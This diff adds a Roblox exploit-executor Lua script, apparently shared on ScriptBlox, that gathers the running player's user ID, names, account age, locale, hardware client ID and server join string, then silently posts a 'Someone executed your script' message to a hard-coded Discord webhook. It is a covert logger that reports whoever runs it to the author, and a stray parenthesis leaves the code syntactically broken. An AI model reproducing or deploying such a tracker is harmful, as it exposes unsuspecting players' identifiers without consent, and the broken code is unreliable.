@@ -1,0 +1,63 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local function detectExecutor()
+    return identifyexecutor()
+end
+
+print(detectExecutor())
+
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+local webhookUrl = "https://discord.com/api/webhooks/1301740329514307675/m7i-LSfiAV9SLfyPfT7Aql3TpZ6KZYJUIlYHJexIsMEyT_Sjeb4r2u4NVvmUz-iDPRFa"
+local webhookData = createWebhookData()
+
+sendWebhook(webhookUrl, webhookData)
